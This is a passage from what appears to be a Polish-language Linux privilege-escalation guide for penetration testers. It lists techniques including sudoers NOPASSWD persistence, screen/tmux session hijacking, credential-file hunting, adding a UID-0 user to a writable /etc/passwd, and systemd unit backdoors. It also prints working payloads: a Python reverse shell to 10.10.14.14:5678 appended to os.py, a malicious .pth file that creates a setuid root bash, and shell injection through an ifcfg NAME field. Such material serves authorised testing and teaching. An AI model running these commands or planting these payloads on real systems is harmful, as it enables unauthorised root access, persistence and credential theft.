echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```

To ścieżka utrwalania dostępu przez ACL i eskalacji uprawnień o dużym wpływie, którą łatwo przeoczyć podczas przeglądu ograniczonego do `ls -l`.

## Otwarte sesje powłoki

Dostęp do sesji GNU Screen innego użytkownika zależy od **konfiguracji i ACL uruchomionej sesji**, a nie tylko od wersji programu. [Dokumentacja GNU Screen](https://www.gnu.org/software/screen/manual/html_node/Multiuser-Session.html) podaje, że program musi być skompilowany z obsługą wielu użytkowników; ustawienie `multiuser on` oraz nadanie uprawnień za pomocą `acladd` lub odpowiedniego `aclchg` pozwala innemu użytkownikowi dołączyć do sesji. [Podręcznik wymaga również setuid-root](https://www.gnu.org/software/screen/manual/html_node/Invoking-Screen.html) do wyszukiwania sesji między użytkownikami. Widoczny socket należący do roota lub plik binarny `screen` z SUID same w sobie nie potwierdzają, że można dołączyć do powłoki roota. Zanim uznasz to za ścieżkę eskalacji, potwierdź, że aktywna sesja obsługuje wielu użytkowników, bieżący użytkownik ma efektywne uprawnienia do wprowadzania danych lub wykonywania poleceń, a powłoka w tej sesji działa z uprawnieniami uprzywilejowanego właściciela.

### screen sessions hijacking

**Wyświetl listę sesji screen**

```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```

![przejmowanie sesji screen - lokalizacje gniazd (niektóre systemy udostępniają jedno jako dowiązanie symboliczne do drugiego): ls /run/screen/ /var/run/screen/ 2 /dev/null](<../../images/image (141).png>)

**Dołącz do sesji**

```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```

## tmux sessions hijacking

Był to problem w **starszych wersjach tmux**. Jako użytkownik bez uprawnień nie udało mi się przejąć sesji tmux (v2.1) utworzonej przez root.

**Wyświetlanie sesji tmux**

```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```

![Lokalizacje socketów (w niektórych systemach jeden jest udostępniany jako dowiązanie symboliczne do drugiego) — przejęcie sesji tmux: tmux -S /tmp/dev sess ls Wyświetl listę przy użyciu tego socketu; możesz uruchomić sesję tmux na tym sockecie...](<../../images/image (837).png>)

**Dołącz do sesji**

```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```

Sprawdź **Valentine box from HTB** jako przykład.

## SSH

### Przewidywalny PRNG OpenSSL w Debianie — CVE-2008-0166

Klucze wygenerowane przy użyciu podatnych kompilacji OpenSSL w Debianie lub jego pochodnych w okresie występowania podatności mogą mieć przewidywalne wartości losowe; obecna dystrybucja systemu lub zaktualizowana wersja OpenSSL nie pozwala ustalić, jak wygenerowano starszy klucz. Sprawdź **konkretny klucz** przy użyciu odpowiedniej historycznej listy zablokowanych kluczy i zweryfikuj jego pochodzenie. Podręcznik Debiana [`ssh-vulnkey` manual](https://manpages.debian.org/wheezy/openssh-client/ssh-vulnkey.1.en.html) opisuje sprawdzanie kluczy publicznych i plików `authorized_keys`, a [DSA-1571-1](https://security-tracker.debian.org/tracker/DSA-1571-1) dokumentuje poprawkę OpenSSL. Wpis w pliku `authorized_keys` uprzywilejowanego konta jest jedynie potencjalną ścieżką eskalacji, jeśli odpowiadający mu klucz prywatny można odzyskać, a efektywna polityka SSH nadal akceptuje ten klucz dla danego konta; słaby klucz **hosta** sam w sobie nie jest poświadczeniem logowania. Wymień przejęte klucze i usuń ich stare autoryzacje.

### Interesujące wartości konfiguracji SSH

- **PasswordAuthentication:** Określa, czy dozwolone jest uwierzytelnianie hasłem. Domyślna wartość w OpenSSH upstream to `yes`; konfiguracja dystrybucji może ją zmienić.
- **PubkeyAuthentication:** Określa, czy dozwolone jest uwierzytelnianie kluczem publicznym. Domyślna wartość to `yes`.
- **PermitEmptyPasswords**: Gdy uwierzytelnianie hasłem jest dozwolone, określa, czy serwer pozwala logować się na konta z pustym hasłem. Domyślna wartość to `no`.

### Pliki kontroli logowania

Te pliki wpływają na to, kto może się zalogować i w jaki sposób:

- **`/etc/nologin`**: jeśli istnieje, blokuje logowanie użytkownikom innym niż root i wyświetla zawarty w nim komunikat.
- **`/etc/securetty`**: ogranicza miejsca, z których root może się zalogować (lista dozwolonych TTY).
- **`/etc/motd`**: komunikat wyświetlany po zalogowaniu (może ujawnić informacje o środowisku lub konserwacji).

### PermitRootLogin

Określa, czy root może logować się przez SSH. Domyślna wartość w OpenSSH upstream to `prohibit-password`; konfiguracja dystrybucji może ją zmienić. Możliwe wartości:

- `yes`: root może logować się przy użyciu hasła i klucza prywatnego
- `without-password` lub `prohibit-password`: root może logować się tylko przy użyciu klucza prywatnego
- `forced-commands-only`: root może logować się tylko przy użyciu klucza prywatnego i jeśli określono opcje poleceń
- `no` : nie

### Zaufane urzędy certyfikacji certyfikatów użytkowników SSH

`TrustedUserCAKeys` wskazuje klucze publiczne, którym sshd ufa przy podpisywaniu certyfikatów **użytkowników**. Jeśli odpowiadający im klucz prywatny CA jest dostępny do odczytu dla użytkownika o niższych uprawnieniach, sprawdź, kto może uzyskać certyfikat i z jakimi nazwami kont może się uwierzytelnić. `AuthorizedPrincipalsFile` lub `AuthorizedPrincipalsCommand` mogą ograniczać akceptowane nazwy; jeśli nie skonfigurowano żadnego z nich, certyfikat musi zawierać nazwę docelowego konta. `PermitRootLogin prohibit-password` blokuje uwierzytelnianie roota hasłem, ale nadal może zezwalać na uwierzytelnianie certyfikatem. Sama ujawniona ścieżka do klucza nie dowodzi dostępu: zweryfikuj parę kluczy publicznego i prywatnego, efektywne reguły `Match`, politykę konta, hasło klucza, unieważnienie oraz akceptowane algorytmy podpisu. Nie umieszczaj bajtów klucza prywatnego w wynikach enumeracji. Zobacz [OpenSSH server configuration manual](https://man.openbsd.org/sshd_config#TrustedUserCAKeys).

Klucz prywatny CA może być użyteczny także **bez możliwości odczytu przez** bieżącego użytkownika, jeśli reguła delegowania uprawnień pozwala mu uruchomić nieograniczony [certificate signer such as `ssh-keygen -s`](https://man.openbsd.org/ssh-keygen#-s) z tożsamością właściciela klucza. Zestaw dokładnie dozwolone polecenie i argumenty z dostępem konta podpisującego do klucza, zaufanym publicznym kluczem CA w efektywnej konfiguracji sshd, nazwą principal akceptowaną dla docelowego konta, okresem ważności certyfikatu oraz polityką logowania tego konta. Delegowane polecenie podpisujące ani sam plik zaufanego CA nie dowodzą dostępu do innego konta; podczas pasywnej enumeracji nie podpisuj certyfikatu testowego.

### AuthorizedKeysFile

Określa pliki zawierające klucze publiczne, których można używać do uwierzytelniania użytkownika. Może zawierać tokeny takie jak `%h`, które zostaną zastąpione katalogiem domowym. **Możesz wskazać ścieżki bezwzględne** (zaczynające się od `/`) lub **ścieżki względne względem katalogu domowego użytkownika**. Na przykład:

```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```

Ta konfiguracja oznacza, że jeśli spróbujesz zalogować się za pomocą **prywatnego** klucza użytkownika "**testusername**", ssh porówna klucz publiczny z Twojego klucza z kluczami znajdującymi się w `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Przekazywanie agenta SSH pozwala **używać lokalnych kluczy SSH zamiast zostawiać klucze** (bez haseł!) na serwerze. Dzięki temu możesz **połączyć się przez ssh z hostem**, a następnie **z niego połączyć się z kolejnym hostem, używając** **klucza** znajdującego się na **początkowym hoście**.

Musisz ustawić tę opcję w `$HOME/.ssh.config` w następujący sposób:

```
Host example.com
  ForwardAgent yes
```

Zwróć uwagę, że jeśli `Host` ma wartość `*`, za każdym razem, gdy użytkownik łączy się z inną maszyną, ten host będzie mógł uzyskać dostęp do kluczy (co stanowi problem bezpieczeństwa).

Plik `/etc/ssh_config` może **nadpisywać** te **opcje** i zezwalać na tę konfigurację lub jej zabraniać.\
Plik `/etc/sshd_config` może **zezwalać** na przekazywanie ssh-agent lub go **zabraniać** za pomocą słowa kluczowego `AllowAgentForwarding` (domyślnie jest dozwolone).

Jeśli zauważysz, że Forward Agent jest skonfigurowany w danym środowisku, zapoznaj się z następną stroną, ponieważ **możesz być w stanie wykorzystać tę konfigurację do podniesienia uprawnień**:


{{#ref}}
../../user-information/ssh-forward-agent-exploitation.md
{{#endref}}

## Interesujące pliki

### Pliki profili

Plik `/etc/profile` i pliki w katalogu `/etc/profile.d/` to **skrypty uruchamiane, gdy użytkownik otwiera nową powłokę**. Dlatego jeśli możesz **zapisywać lub modyfikować którykolwiek z nich, możesz podnieść uprawnienia**.

```bash
ls -l /etc/profile /etc/profile.d/
```

Jeśli zostanie znaleziony jakiś nietypowy skrypt profilu, należy sprawdzić, czy zawiera **poufne informacje**.

### Pliki Passwd/Shadow

W zależności od systemu operacyjnego pliki `/etc/passwd` i `/etc/shadow` mogą mieć inne nazwy lub mogą istnieć ich kopie zapasowe. Dlatego zaleca się **znaleźć wszystkie** takie pliki i **sprawdzić, czy można je odczytać**, aby ustalić, **czy zawierają hashe**:

```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```

W niektórych przypadkach można znaleźć **hashe haseł** w pliku `/etc/passwd` (lub jego odpowiedniku)

```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```

### Zapisywalny /etc/passwd

Najpierw wygeneruj hasło za pomocą jednego z poniższych poleceń.

```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```

Następnie dodaj użytkownika `hacker` i ustaw wygenerowane hasło.

```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```

Np.: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Możesz teraz użyć polecenia `su`, podając `hacker:hacker`

Możesz też użyć poniższych wierszy, aby dodać użytkownika tymczasowego bez hasła.\
OSTRZEŻENIE: może to obniżyć obecny poziom bezpieczeństwa maszyny.

```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```

UWAGA: Na platformach BSD `/etc/passwd` znajduje się w plikach `/etc/pwd.db` i `/etc/master.passwd`, a `/etc/shadow` nosi nazwę `/etc/spwd.db`.

Sprawdź, czy możesz **zapisywać wrażliwe pliki**. Na przykład, czy możesz zapisywać w jakimś **pliku konfiguracyjnym usługi**?

```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```

Na przykład, jeśli na maszynie działa serwer **tomcat** i możesz **modyfikować plik konfiguracji usługi Tomcat w katalogu /etc/systemd/,** możesz zmienić następujące wiersze:

```
ExecStart=/path/to/backdoor
User=root
Group=root
```

Twoje backdoor zostanie wykonane przy następnym uruchomieniu tomcata.

### Sprawdź katalogi

W następujących katalogach mogą znajdować się kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie uda Ci się odczytać zawartości ostatniego katalogu, ale spróbuj)

```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```

### Nietypowa lokalizacja / pliki należące do użytkownika

```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
      do printf "  Group $g:\n";
      find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
      done
done
```

### Zmodyfikowane pliki w ciągu ostatnich minut

```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```

### Pliki baz danych Sqlite

```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```

W przypadku baz danych aplikacji, do których można uzyskać dostęp do odczytu, sprawdź nazwy tabel i kolumn pod kątem nazw użytkowników i hashy haseł. Znalezienie hasha, odzyskanie hasła i potwierdzenie jego ponownego użycia na koncie lokalnym to osobne kroki; sam ogólny ciąg 32 znaków szesnastkowych nie wystarcza, by stwierdzić, że to MD5 ani że można uzyskać dostęp do konta.

### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files

```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```

Jeśli czytelna historia powłoki zawiera polecenie `sudo`, po którym następuje krótka linia przypominająca hasło, ręcznie sprawdź sąsiednie linie. Hasło wpisane w zwykłym monicie `sudo` nie jest zapisywane w historii powłoki; kolejna linia może być przypadkowym wejściem do powłoki, ale nie dowodzi, że hasło jest prawidłowe. Znacznik `.sudo_as_admin_successful` odnotowuje wcześniejsze użycie, a nie aktualne uprawnienia.

### Ukryte pliki

```bash
find / -type f -iname ".*" -ls 2>/dev/null
```

### **Skrypty/pliki binarne w PATH**

```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```

### **Pliki webowe**

```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```

### **Kopie zapasowe**

Sprawdź pliki możliwe do odczytu w katalogach kopii zapasowych, a także pliki, których **nazwy** zawierają `backup`: archiwum o nieczytelnej nazwie lub z rozszerzeniem wskazującym na szyfrowanie nadal może ujawniać stare dane aplikacji. Zaszyfrowane archiwum jest jedynie potencjalnym źródłem ujawnienia danych. Odzyskanie hasła, sprawdzenie zawartości archiwum, odzyskanie hasha aplikacji i ponowne użycie tego hasła do konta Unix to odrębne kroki, które trzeba zweryfikować; hash w archiwum nie potwierdza możliwości lokalnego logowania.

Możliwe do odczytu kopie zapasowe maszyn wirtualnych również wymagają sprawdzenia. Konfiguracja VirtualBox `.vbox` może wskazywać podłączone obrazy `.vdi` i zawierać metadane zaszyfrowanego klucza dysku; [dokumentacja VirtualBox informuje, że zaszyfrowany klucz danych jest przechowywany w konfiguracji maszyny wirtualnej](https://docs.oracle.com/en/virtualization/virtualbox/7.0/user/AdvancedTopics.html). Zanim będzie możliwe sprawdzenie dysku offline, dostępne muszą być zarówno konfiguracja, jak i obraz. Wolumin systemu gościa może mieć własną [warstwę szyfrowania LUKS](https://gitlab.com/cryptsetup/cryptsetup/-/blob/main/man/cryptsetup.8.adoc), która wymaga osobnego klucza. Nawet po autoryzowanym odszyfrowaniu stare skrypty lub konfiguracja mogą zawierać hasło; zanim uznasz to za lokalną eskalację uprawnień, ustal, czy dane logowania są aktualne dla konta na hoście oraz czy efektywna polityka `sudo` zezwala na wykonanie polecenia z podwyższonymi uprawnieniami. Podczas pasywnego rozpoznania zinwentaryzuj ścieżki i uprawnienia, nie kopiując, nie odszyfrowując ani nie montując obrazów.

Sprawdzając archiwum możliwe do odczytu, najpierw wyświetl nazwy plików, które zawiera, a dopiero potem cokolwiek rozpakuj: mogą się w nim znajdować ukryte pliki uwierzytelniające, materiały z kodami odzyskiwania lub klucze SSH, nawet jeśli ich aktywne kopie są chronione. Nazwy plików jedynie wskazują potencjalny trop; sam materiał i ewentualne ponowne użycie danych konta trzeba zweryfikować osobno.

W pierwszej kolejności sprawdzaj **archiwa możliwe do odczytu, należące do innego użytkownika** w katalogach kopii zapasowych, zwłaszcza archiwa należące do roota i dostępne przez członkostwo w grupie. Stare archiwum może zawierać konfigurację lub sekret uwierzytelniający, nawet jeśli aktywna kopia jest chroniona. W przypadku lokalnego interfejsu do zarządzania kopiami zapasowymi, takiego jak [Backrest](https://garethgeorge.github.io/backrest/), sprawdź efektywne konto usługi oraz to, czy użytkownik z niższymi uprawnieniami może odczytać jej konfigurację lub uwierzytelnić się w interfejsie. Jego [hooks](https://garethgeorge.github.io/backrest/docs/hooks) i [interfejs poleceń restic](https://github.com/garethgeorge/backrest/blob/main/proto/v1/service.proto) mogą działać z uprawnieniami usługi do plików i poleceń; sam nasłuch na loopback nie przesądza o skutkach. `passwordBcrypt` w Backrest to hash bcrypt zakodowany w base64, a nie hasło w postaci jawnej; opisano go w [kodzie uwierzytelniania](https://github.com/garethgeorge/backrest/blob/main/internal/auth/auth.go). Zanim uznasz ujawnione archiwum lub interfejs za granicę uprawnień, potwierdź tożsamość usługi, możliwość użycia danych uwierzytelniających oraz dostęp do odpowiedniego planu lub repozytorium.

```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```

### Znane pliki zawierające hasła

Przeczytaj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) — narzędzie wyszukuje **różne pliki, które mogą zawierać hasła**.\
**Innym interesującym narzędziem**, którego możesz użyć w tym celu, jest [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — aplikacja open source służąca do odzyskiwania wielu haseł zapisanych na lokalnym komputerze z systemem Windows, Linux lub Mac.

Jeśli plik `/etc/guacamole/guacamole.properties` jest dostępny do odczytu, sprawdź ustawienia połączeń z bazą danych `mysql-*`, `postgresql-*` lub `sqlserver-*`. Jeśli konto ma uprawnienia do odczytu tabel Guacamole JDBC, tabela `guacamole_connection_parameter` może zawierać zapisane wartości `username`, `password`, `private-key` lub `passphrase` dla SSH. Zacznij od identyfikatorów połączeń i nazw parametrów, a następnie sprawdź tylko odpowiednie wiersze; zapisana wartość może być tokenem dynamicznym lub odwołaniem do sejfu, a nie sekretem nadającym się do ponownego użycia. Zobacz [schemat Guacamole JDBC](https://guacamole.apache.org/doc/gug/jdbc-auth-schema.html) i [parametry połączeń SSH](https://guacamole.apache.org/doc/gug/configuring-guacamole.html).

[Menedżer haseł pswm](https://github.com/Julynx/pswm#usage) domyślnie przechowuje zaszyfrowany sejf w `~/.local/share/pswm/pswm`. Jeśli widzisz sejf innego użytkownika, sprawdź jego właściciela oraz to, czy Twoje konto rzeczywiście może go odczytać. Sama ścieżka do sejfu nie ujawnia danych logowania; odzyskanie hasła głównego, znalezienie hasła do konta nadającego się do ponownego użycia oraz potwierdzenie uprawnień tego konta to odrębne kroki.

[Domyślna baza danych Passpie](https://passpie.readthedocs.io/en/latest/faq.html#what-is-a-passpie-database) znajduje się w `~/.passpie/` i zawiera pęk kluczy `.keys` oraz zaszyfrowane pliki danych logowania `.pass` w katalogach grup. Widoczny katalog bazy danych to jedynie wskazówka dotycząca ścieżki: potwierdź dostęp do klucza i odpowiedniego zaszyfrowanego wpisu, sprawdź, czy wymagane jest hasło główne, oraz ustal, czy odzyskane dane logowania należą do konta o wyższych uprawnieniach. Passpie obsługuje również [niestandardowe ścieżki baz danych](https://passpie.readthedocs.io/en/latest/getting_started.html#multiple-databases), więc domyślna ścieżka nie obejmuje wszystkich możliwości. Automatyczne wyliczanie powinno ograniczać się do wyświetlania metadanych, bez eksportowania danych logowania ani wypisywania materiału kluczowego.

### Dzienniki

Jeśli możesz odczytywać dzienniki, możesz znaleźć w nich **interesujące/poufne informacje**. Im dziwniejszy dziennik, tym będzie ciekawszy (prawdopodobnie).\
Ponadto niektóre nieprawidłowo skonfigurowane (z backdoorem?) **dzienniki audytu** mogą pozwalać na **zapisywanie haseł** w dziennikach audytu, jak wyjaśniono w tym wpisie: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).<sup>[[36]](#references)</sup>

```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

Aby **odczytywać logi, grupa** [**adm**](../../user-information/interesting-groups-linux-pe/index.html#adm-group) będzie bardzo pomocna.

### Pliki powłoki

```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```

### Ogólne wyszukiwanie creds/wyrażeń regularnych

Warto też sprawdzić, czy w nazwach plików lub ich zawartości występuje słowo „**password**”, a także poszukać adresów IP i e-maili w logach oraz wyrażeń regularnych dla hashy.\
Nie będę tutaj opisywać, jak to wszystko zrobić, ale jeśli Cię to interesuje, możesz sprawdzić ostatnie kontrole wykonywane przez [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki z prawem zapisu

### Python library hijacking

Jeśli wiesz, **skąd** zostanie uruchomiony skrypt Pythona i **możesz zapisywać w tym folderze** albo modyfikować biblioteki Pythona, możesz zmodyfikować bibliotekę systemu operacyjnego i umieścić w niej backdoor (jeśli możesz zapisywać w folderze, z którego zostanie uruchomiony skrypt Pythona, skopiuj i wklej bibliotekę `os.py`).

Aby umieścić backdoor w bibliotece, dodaj na końcu pliku `os.py` poniższy wiersz (zmień IP i PORT):

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

#### Plik `.pth` z możliwością zapisu przetwarzany przez `site.addsitedir()`

Nie traktuj `site.addsitedir(DIR)` jako odpowiednika `sys.path.append(DIR)`. Ta funkcja przetwarza również każdy plik `*.pth` w `DIR`. Wiersz zaczynający się od `import`, po którym następuje spacja lub tabulator, jest wykonywany jako kod Pythona. Wiersze zawierające ścieżki są natomiast rozwiązywane względem katalogu site i dodawane tylko wtedy, gdy wskazane ścieżki istnieją.<sup>[[38]](#references)</sup>

Może to prowadzić do eskalacji uprawnień, gdy program Pythona dozwolony przez sudo lub działający z innymi podwyższonymi uprawnieniami wywołuje `site.addsitedir()` dla katalogu, do którego bieżący użytkownik lub jedna z jego grup ma prawo zapisu. Kod z pliku `.pth` uruchamia się, gdy uprzywilejowany program konfiguruje ścieżkę importu, przed wykonaniem jego standardowej operacji.<sup>[[38]](#references)[[39]](#references)</sup>

```bash
# Find explicit consumers and inspect every selected directory's ownership
grep -R "site\.addsitedir" /opt /usr/local 2>/dev/null
namei -l /opt/app/plugins/dev
find /opt/app/plugins/dev -maxdepth 1 -type f -name '*.pth' -ls

# Verify execution through a one-line path configuration file
printf '%s\n' "import os; os.system('id')" > /opt/app/plugins/dev/probe.pth
sudo /usr/bin/python3 /opt/app/controller.py status
```

Wykonywalna zawartość `.pth` musi mieścić się w jednym wierszu, ale średniki pozwalają umieścić w nim kilka instrukcji. Na przykład ścieżka wykonywana jako root może utworzyć kopię Bash z ustawionym setuid; uruchom Bash z opcją `-p`, aby zachował efektywny identyfikator użytkownika.<sup>[[39]](#references)</sup>

```bash
printf '%s\n' "import os; os.system('cp /bin/bash /tmp/rootshell; chmod 4755 /tmp/rootshell')" \
  > /opt/app/plugins/dev/pwn.pth
sudo /usr/bin/python3 /opt/app/controller.py status
/tmp/rootshell -p
```

Opcja `-S` wyłącza tylko automatyczną inicjalizację `site` przez Pythona. Nie chroni programu, który jawnie importuje `site` i wywołuje `site.addsitedir()`. Usuń katalogi, które może modyfikować atakujący, ze ścieżek importu używanych z podwyższonymi uprawnieniami oraz wymagaj, aby katalog i jego pliki `.pth` należały wyłącznie do administratora i tylko on mógł je modyfikować.<sup>[[38]](#references)[[39]](#references)</sup>

### Eksploatacja logrotate

Zadanie `logrotate` uruchamiane z podwyższonymi uprawnieniami może utworzyć ścieżkę umożliwiającą zapis do pliku innego użytkownika, gdy faktycznie rotuje log znajdujący się w katalogu, który użytkownik o niższych uprawnieniach może podmienić lub przekierować podczas rotacji. Sam fakt, że log jest zapisywalny, to tylko wskazówka. Sprawdź dokładnie aktywną regułę oraz jej dyrektywy `create`, `olddir` i `su`; efektywną tożsamość procesu planującego zadanie; uprawnienia do zapisu i przeszukiwania katalogu nadrzędnego logu; a także to, czy zainstalowana wersja i polityka zezwalają na zmianę miejsca docelowego. Później uruchomiona powłoka z podwyższonymi uprawnieniami musi też wczytać utworzony plik, aby zapis do pliku startowego doprowadził do wykonania poleceń. Sprawdź harmonogram, regułę, wersję i sposób pakowania oraz metadane ścieżki — nie wywołuj rotacji ani nie próbuj wykorzystać wyścigu.

> [!TIP]
> Nie traktuj `3.18.0` ani żadnego innego numeru wersji jako jedynej granicy podatności. [Dziennik zmian upstream](https://github.com/logrotate/logrotate/blob/main/ChangeLog.md) odnotowuje utwardzanie zabezpieczeń katalogów i symlinków w wielu wydaniach, a dystrybucje mogą przenosić poprawki do starszych wersji. [Podręcznik upstream](https://github.com/logrotate/logrotate/blob/main/logrotate.8.in) zaleca użycie `su`, gdy root rotuje logi w katalogach kontrolowanych przez użytkowników bez podwyższonych uprawnień; zweryfikuj efektywną regułę i rzeczywiste działanie.

Bardziej szczegółowe informacje o podatności można znaleźć na tej stronie: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).<sup>[[37]](#references)</sup>

Możesz wykorzystać tę podatność za pomocą [**logrotten**](https://github.com/whotwagner/logrotten).

Ta podatność jest bardzo podobna do [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logi nginx),** więc gdy tylko okaże się, że możesz modyfikować logi, sprawdź, kto nimi zarządza, i czy możesz podnieść uprawnienia, zastępując logi symlinkami.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Odnośnik do podatności:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f).<sup>[[20]](#references)</sup>

Plik `ifcfg-*` to wskazówka do dalszej analizy, gdy użytkownik o niższych uprawnieniach może go utworzyć lub zmienić **oraz** uprzywilejowana ścieżka aktywacji sieci odczyta właśnie ten plik. Sprawdź efektywne uprawnienia do pliku i katalogu, wybrany interfejs, zainstalowaną implementację `ifup`/`ifdown` oraz to, kto ją wywołuje. Sam zapis do pliku nie powoduje wykonania kodu. [Przewodnik Red Hat po sieci w RHEL 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/networking_guide/sec-using_networkmanager_with_sysconfig_files) rozróżnia starsze skrypty sieciowe od NetworkManager: ten drugi sam w sobie nie uruchamia tych pierwszych. [Dokumentacja RHEL 8](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/configuring_and_managing_networking/assembly_legacy-network-scripts-support-in-rhel_configuring-and-managing-networking) informuje, że domyślne `ifup`/`ifdown` korzystają z NetworkManager, a opcjonalny pakiet starszych skryptów dostarcza skrypty powłoki.

W systemie faktycznie używającym starszych skryptów uruchamianych z podwyższonymi uprawnieniami nieujęte w cudzysłów przypisanie `ifcfg-*`, które jest interpretowane przez powłokę, takie jak `NAME=`, może przekroczyć granicę umożliwiającą wykonanie kodu. Zweryfikuj dokładny parser, wartość i ścieżkę aktywacji; nie zakładaj interpretacji przez powłokę na podstawie samej nazwy pliku ani obecności NetworkManager. Wrapper dozwolony przez sudo, który zapisuje dane wejściowe wywołującego do pliku `ifcfg-*`, a następnie wywołuje starsze `ifup`, stanowi odrębną drogę do tej granicy, nawet jeśli wywołujący nie może bezpośrednio edytować pliku.

Na przykład: _/etc/sysconfig/network-scripts/ifcfg-1337_

```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```

(_Zwróć uwagę na odstęp między Network a /bin/id_)

### **init, init.d, systemd i rc.d**

